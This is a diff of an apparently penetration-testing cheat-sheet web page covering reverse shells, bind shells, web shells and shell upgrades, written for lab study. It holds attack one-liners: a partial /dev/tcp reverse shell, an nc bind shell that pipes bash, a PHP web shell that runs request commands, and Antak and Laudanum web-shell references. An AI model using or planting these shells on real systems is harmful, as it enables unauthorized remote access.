@@ -69,6 +69,8 @@
 </ul>
 
 <h1 id="reverse-shell"><a href="https://www.revshells.com/">Reverse Shell</a></h1>
+<p>With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection.</p>
+
 <p>If we can execute commands on the target, we can try to create MSFVenom payload and execute it inside target</p>
 
 <h2 id="windows">Windows</h2>
@@ -123,6 +125,8 @@ sh <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14
 <hr />
 
 <h1 id="bind-shells">Bind Shells</h1>
+<p>With a bind shell, the target system has a listener started and awaits a connection from a pentester’s system.</p>
+
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash
 <span class="nv">$ </span><span class="nb">rm</span> <span class="nt">-f</span> /tmp/f<span class="p">;</span> <span class="nb">mkfifo</span> /tmp/f<span class="p">;</span> <span class="nb">cat</span> /tmp/f | /bin/bash <span class="nt">-i</span> 2&gt;&amp;1 | nc <span class="nt">-l</span> 10.129.41.200 7777 <span class="o">&gt;</span> /tmp/f
 
@@ -133,14 +137,14 @@ sh <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14
 <hr />
 
 <h1 id="web-shells"><a href="https://github.com/jbarcia/Web-Shells/tree/master/laudanum">Web Shells</a></h1>
-<p><code class="language-plaintext highlighter-rouge">/usr/share/laudanum</code></p>
+<p><code class="language-plaintext highlighter-rouge">copy from /usr/share/laudanum</code></p>
 
 <h2 id="php"><a href="https://github.com/WhiteWinterWolf/wwwolf-php-webshell">PHP</a></h2>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php SYSTEM<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span><span class="p">;</span> ?&gt;
 </code></pre></div></div>
 
 <h2 id="aspx-antak-webshell"><a href="https://github.com/samratashok/nishang/tree/master/Antak-WebShell">ASPX Antak Webshell</a></h2>
-<p><code class="language-plaintext highlighter-rouge">/usr/share/nishang/Antak-WebShell</code></p>
+<p><code class="language-plaintext highlighter-rouge">copy from /usr/share/nishang/Antak-WebShell</code></p>
 
 <blockquote>
   <p>Antak is a web shell built-in ASP.Net. Antak utilizes PowerShell to interact with the host, making it great for acquiring a web shell on a Windows server.</p>
@@ -163,15 +167,14 @@ sh <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14
 <span class="nv">$ </span>zip <span class="nt">-r</span> backup.war cmd.jsp 
 </code></pre></div></div>
 
-<h2 id="upgrade-shell">Upgrade Shell</h2>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
+<h1 id="interactive-shells">Interactive Shells</h1>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Python</span>
+python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
 <span class="s2">"CTRL+Z"</span>
 <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg
 export </span><span class="nv">TERM</span><span class="o">=</span>xterm
-</code></pre></div></div>
 
-<h2 id="interactive-shells">Interactive Shells</h2>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># /bin/sh -i</span>
+<span class="c"># /bin/sh -i</span>
 /bin/sh <span class="nt">-i</span>
 
 <span class="c"># Perl</span>
